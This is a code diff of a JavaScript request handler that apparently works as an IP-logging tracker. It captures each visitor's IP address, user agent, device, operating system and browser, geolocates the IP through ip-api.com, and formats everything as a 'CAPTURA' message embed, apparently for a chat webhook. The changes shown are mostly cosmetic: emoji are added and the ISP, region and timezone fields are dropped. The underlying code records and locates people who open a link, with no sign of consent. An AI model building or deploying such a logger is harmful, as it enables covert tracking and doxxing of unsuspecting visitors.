@@ -31,26 +31,25 @@ module.exports = async function handler(req, res) {
     return "Unknown";
   })();
 
-  const device = /mobile|android|iphone/i.test(ua) ? "Mobile" : /ipad|tablet/i.test(ua) ? "Tablet" : "Desktop";
+  const device = /mobile|android|iphone/i.test(ua) ? "📱 Mobile" : /ipad|tablet/i.test(ua) ? "📟 Tablet" : "🖥️ Desktop";
   const system = /windows/i.test(ua) ? "Windows" : /android/i.test(ua) ? "Android" : /iphone|ios/i.test(ua) ? "iOS" : /mac/i.test(ua) ? "MacOS" : /linux/i.test(ua) ? "Linux" : "Unknown";
 
   let geo = {};
   try {
-    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,timezone,query`);
+    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,query`);
     if (geoRes.ok) geo = await geoRes.json();
   } catch {}
 
   const embed = {
-    title: `CAPTURA · PÚBLICO · ${endpoint}`,
+    title: `📡 CAPTURA · PÚBLICO · ${endpoint}`,
     color: 0x2ecc71,
     fields: [
-      { name: "Ubicación", value: `${geo.city || "Desconocida"}, ${geo.country || "Desconocido"}`, inline: false },
-      { name: "Dirección IP", value: `\`${ip}\``, inline: true },
-      { name: "Proveedor", value: geo.isp || "Desconocido", inline: true },
-      { name: "Sistema", value: system, inline: true },
-      { name: "Navegador", value: browser, inline: true },
-      { name: "Tipo", value: device, inline: true },
-      { name: "User Agent", value: "```" + ua.substring(0, 150) + "```", inline: false }
+      { name: "📍 Ubicación", value: `${geo.city || "Desconocida"}, ${geo.country || "Desconocido"}`, inline: false },
+      { name: "🌐 Dirección IP", value: `\`${ip}\``, inline: false },
+      { name: "💻 Sistema", value: system, inline: false },
+      { name: "🌍 Navegador", value: browser, inline: false },
+      { name: "🖥️ Tipo", value: device, inline: false },
+      { name: "📜 User Agent", value: "```" + ua.substring(0, 150) + "```", inline: false }
     ],
     footer: {
       text: `Público · ${endpoint} · ${new Date().toLocaleString()}`
